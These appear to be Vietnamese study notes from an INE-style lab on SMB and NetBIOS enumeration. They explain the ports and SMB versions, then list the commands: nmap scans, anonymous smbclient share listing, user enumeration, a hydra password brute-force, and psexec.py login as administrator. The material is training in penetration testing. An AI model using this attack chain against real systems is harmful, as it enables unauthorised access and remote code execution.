# SMB & NetBIOS Enumeration

SMB và NetBIOS khá giống nhau nhưng là 2 dịch vụ khác nhau

## NetBIOS

NetBIOS (Network Basic Input/Output System) là 1 API và 1 bộ giao thức mạng để cung cấp dịch vụ truyền thông qua mạng cục bộ, chủ yếu dùng cho các ứng dụng trong máy tính cục bộ tương tác với nhau

Function NetBIOS:

- Name Service (NetBIOS-NS): cho phép máy tính register, unregister, resolve names trong mạng nội bộ 

- Datagram Service (NetBIOS-DGM): hỗ trợ kết nối và phát sóng (broadcasting)

- Session Service (NetBIOS-SNN): hỗ trợ kết nối và giao tiếp tin cậy

Port 137 (Name Service), 138 (Datagram Service), 139 (Session Service) (UDP, TCP)

## SMB

SMB (Server Message Block) là 1 giao thức chia sẻ tệp trong mạng cho phép máy tính share file, máy in

Function: SMB cung cấp tính năng cho tệp và máy in gọi là pipe và giao tiếp giữa các tiến trình gọi là (IPC) 

Version: 

- SMB 1.0: là phiên bản đầu tiên, có nhiều lỗ hổng, dùng trong các window đời thấp như XP

- SMB 2.0/2.1: trong win Vista/ Windows server 2008, hiệu suất và bảo mật được cải thiện 

- SMB 3.0+: windows 8/ windows server 2012, thêm các tính năng mã hóa, hỗ trợ nhiều kênh và ảo hóa


Port 445 (SMB) hoặc 139 (cùng NetBIOS)

### lab

`nmap demo.ine.local`

có port 139 netbios-ssn và 445 microsoft-ds

`nmap -sU -sV -T4 --script=nbstat.nse -p137 -Pn -n 10.4.30.139`

`nmap -sV -p 139.445 demo.ine.local`

`nmap -p445 --script=smb-protocols demo.ine.local`

`nmap -p445 --script=smb-security-mode demo.ine.local`

`smbclient -L demo.ine.local` -> bắt nhập password -> enter vì bảo mật con này yếu 

`nmap -p445 --script=smb-enum-user.nse demo.ine.local`

`vim user.txt` -> liệt kê các user vừa tìm được mỗi cái 1 dòng 

`hydra -L user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`

-> tìm được mật khẩu

`psexec.py administrator@demo.ine.local` -> nhập pass


















